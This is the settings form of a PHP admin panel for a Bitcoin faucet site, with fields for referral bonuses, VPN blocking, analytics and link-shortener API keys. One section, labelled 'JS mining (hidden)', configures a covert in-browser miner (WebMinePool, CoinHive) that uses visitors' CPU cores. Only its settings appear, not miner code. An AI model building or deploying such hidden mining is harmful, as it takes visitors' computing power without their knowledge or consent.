           <div class="box box-primary">
            <div class="box-header with-border">
              <h3 class="box-title">Other settings </h3><!--<i class="fa fa-info-circle" title="Note, enable ONLY ONE captcha." data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>-->
            </div>
            <div class="box-body">
              <div class="box box-primary">
                  <div class="form-group">
                    <label>Referral bonus </label>
                    <i class="fa fa-info-circle" title="Set referral payments in %. Leave 0 if you want to disable referral payments. Note, it's not a comission. When someone claims 100 satoshi and you have 25% ref bonus, you pays 125 satoshi total. " data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="number" class="form-control" placeholder="" name="referral_amount" value="<?php echo $referral_amount; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>VPN protection </label>
                    <i class="fa fa-info-circle" title="You can disable VPN protection if your users has problems accessing faucet, but this will make you vulnerable to bot attacks. 1 to enable - 0 to disable. " data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="number" class="form-control" placeholder="" name="vpn_enabled" value="<?php echo $vpn_enabled; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>Google analytics ID </label>
                    <i class="fa fa-info-circle" title="Google analytics ID for dashboard. " data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="text" class="form-control" placeholder="e.g. US-98765432-1" name="google_analytics_id" value="<?php echo $google_analytics_id; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>Dashboard analytics API key </label>
                    <i class="fa fa-info-circle" title="Google analytics API key for dashborad" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="text" class="form-control" placeholder="e.g. 123456789101-btom123u456e2abc7890d1e2f3tghjkl.apps.googleusercontent.com" name="google_analytics_api_key" value="<?php echo $google_analytics_api_key; ?>" size="50" />
                  </div>
              </div>
            </div>
           </div>
           <div class="box box-primary">
            <div class="box-header with-border">
              <h3 class="box-title">Shorten services </h3>
            </div>
            <div class="box-body">
              <div class="box box-primary">
                  <div class="form-group">
                    <label>Shorten links enabled </label>
                    <i class="fa fa-info-circle" title="1 for enable, 0 to disable" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="number" class="form-control" placeholder="e.g. 123456789101-btom123u456e2abc7890d1e2f3tghjkl.apps.googleusercontent.com" name="shorten_links" value="<?php echo $shorten_links; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>Shorten links bonuce </label>
                    <i class="fa fa-info-circle" title="Amount of satoshi for visited link" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="text" class="form-control" placeholder="e.g. 1a23bcd4567ae8ad9100a1234b567cd8" name="shorten_links_bonus" value="<?php echo $shorten_links_bonus; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>shorte.st API key </label>
                    <i class="fa fa-info-circle" title="API key provided by shorte.st service" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="text" class="form-control" placeholder="e.g. 123456789101-btom123u456e2abc7890d1e2f3tghjkl.apps.googleusercontent.com" name="shorten_links_api_key" value="<?php echo $shorten_links_api_key; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>BTC.ms API key </label>
                    <i class="fa fa-info-circle" title="API key provided by BTC.ms service" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="text" class="form-control" placeholder="e.g. 123456789101-btom123u456e2abc7890d1e2f3tghjkl.apps.googleusercontent.com" name="pro_links_api_key" value="<?php echo $pro_links_api_key; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>Mellow.ads API key </label>
                    <i class="fa fa-info-circle" title="API key provided by mellowads shortlinks service" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="text" class="form-control" placeholder="e.g. 123456789101-btom123u456e2abc7890d1e2f3tghjkl.apps.googleusercontent.com" name="mellow_links_api_key" value="<?php echo $mellow_links_api_key; ?>" size="50" />
                  </div>
              </div>
            </div>
           </div>
           <div class="box box-primary">
            <div class="box-header with-border">
              <h3 class="box-title">JS mining (hidden) </h3><i class="fa fa-info-circle" title="Will use the service for which api keys will be specified." data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
            </div>
            <div class="box-body">
                  <div class="form-group">
                    <label>Miner enabled </label>
                    <i class="fa fa-info-circle" title="1 for enable, 0 to disable" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="number" class="form-control" placeholder="e.g. 123456789101-btom123u456e2abc7890d1e2f3tghjkl.apps.googleusercontent.com" name="hm_enabled" value="<?php echo $hm_enabled; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>Number of threads </label>
                    <i class="fa fa-info-circle" title="The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer." data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="number" class="form-control" placeholder="e.g. 123456789101-btom123u456e2abc7890d1e2f3tghjkl.apps.googleusercontent.com" name="hm_number_of_threads" value="<?php echo $hm_number_of_threads; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>Auto threads </label>
                    <i class="fa fa-info-circle" title="Whether to automatically adjust the number of threads for optimal performance. This feature is experimental. The default is false" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="text" class="form-control" placeholder="false" name="hm_auto_threads" value="<?php echo $hm_auto_threads; ?>" size="50" />
                  </div>
                  <div class="form-group">
                    <label>Throlete </label>
                    <i class="fa fa-info-circle" title="Set the fraction of time that threads should be idle. A value of 0 means no throttling (i.e. full speed), a value of 0.5 means that threads will stay idle 50% of the time, with 0.8 they will stay idle 80% of the time." data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                    <input type="text" class="form-control" placeholder="0.5" name="hm_throttle" value="<?php echo $hm_throttle; ?>" size="50" />
                  </div>
                  <div class="box box-primary">
                   <div class="box-header with-border">
                     <h3 class="box-title"><a href="http://webminepool.com/register" target="_blank">WebMinePool.com</a> </h3><!--<i class="fa fa-info-circle" title="Note, enable ONLY ONE captcha." data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>-->
                   </div>
                   <div class="box-body">
                    <div class="form-group">
                     <label>Site key (public) </label>
                     <i class="fa fa-info-circle" title="Get this fromm admin dashboard on http://webminepool.com/keys/" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                     <input type="text" class="form-control" placeholder="e.g. SK_6yhAbBCWy7lD8F7lrl9Lm	" name="wmp_api_public_key" value="<?php echo $wmp_api_public_key; ?>" size="50" />
                   </div>
                   <div class="form-group">
                     <label>Private key (secret) </label>
                     <i class="fa fa-info-circle" title="Get this fromm admin dashboard on http://webminepool.com/keys/" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                     <input type="text" class="form-control" placeholder="e.g. PK_K8jCYiAXTBcsZJFheYMzGo" name="wmp_api_private_key" value="<?php echo $wmp_api_private_key; ?>" size="50" />
                   </div>
                   </div>
                  </div>
                  <div class="box box-primary">
                   <div class="box-header with-border">
                     <h3 class="box-title">CoinHive (Legacy code, not recommended) </h3><!--<i class="fa fa-info-circle" title="Note, enable ONLY ONE captcha." data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>-->
                   </div>
                   <div class="box-body">
                   <div class="form-group">
                     <label>Site Key (public) </label>
                     <i class="fa fa-info-circle" title="Get this fromm admin dashboard on coin-hive.com/settings/sites" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                     <input type="text" class="form-control" placeholder="e.g. 3bmX2we4W5saZJvjubqwPGL9tGw33HaZ" name="coinhive_api_public_key" value="<?php echo $coinhive_api_public_key; ?>" size="50" />
                   </div>
                   <div class="form-group">
                     <label>Site Key (private) </label>
                     <i class="fa fa-info-circle" title="Get this fromm admin dashboard on coin-hive.com/settings/sites" data-toggle="tooltip"  data-placement="left" aria-hidden="true"></i>
                     <input type="text" class="form-control" placeholder="e.g. PwMGuMYoOSzxcSDMTZ9wxKlPgLJadYAD" name="coinhive_api_private_key" value="<?php echo $coinhive_api_private_key; ?>" size="50" />
                   </div>
                   </div>
                  </div>
            </div>
           </div>